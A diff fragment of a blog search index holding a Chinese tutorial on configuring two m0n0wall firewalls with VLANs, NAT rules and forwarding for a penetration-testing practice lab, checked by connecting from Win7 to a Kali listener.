+<p><strong>mono02</strong><br><img src="https://img-blog.csdnimg.cn/20210320232851327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210320233253742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>tips：这里稍微提醒下就是，必须得划分vlan才能对网卡进行选择，要不然外网的WAN不能识别网卡(WAN那块一直显示sis1 ╮(╯▽╰)╭)，至于为什么我也不知道，欢迎大佬评论解释！LAN对应的是内网网卡，WAN对应的是外网网卡，选择桥接模式。</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>首先是对我们自己公司的防火墙也就是<strong>mono01</strong>进行配置，LAN那个保持默认就好，我们得添加NAT规则和外网转发策略<br><img src="https://img-blog.csdnimg.cn/20210320233950438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>取消掉这个选项，因为他屏蔽了类似192.168的网段的连接，点击save<br><img src="https://img-blog.csdnimg.cn/20210320234159252.png" alt="在这里插入图片描述"></p>
+<p>NAT规则的设置，设置完成记得点保存！！！<br><img src="https://img-blog.csdnimg.cn/20210320234427762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后接着我们设置<strong>mono02</strong>的配置，mono02的配置较简单，只需将Block选项取消掉即可<br><img src="https://img-blog.csdnimg.cn/20210320234644747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了检验最后的效果，我们在kali上开启一个服务器，监听的端口号为4444<br><img src="https://img-blog.csdnimg.cn/20210320234947351.png" alt="在这里插入图片描述"><br>在win7上访问mono01的公网IP，显示连接成功即搭建成功！！！<br><img src="https://img-blog.csdnimg.cn/20210320235029633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>红蓝对抗</tag>
       </tags>
   </entry>
 </search>
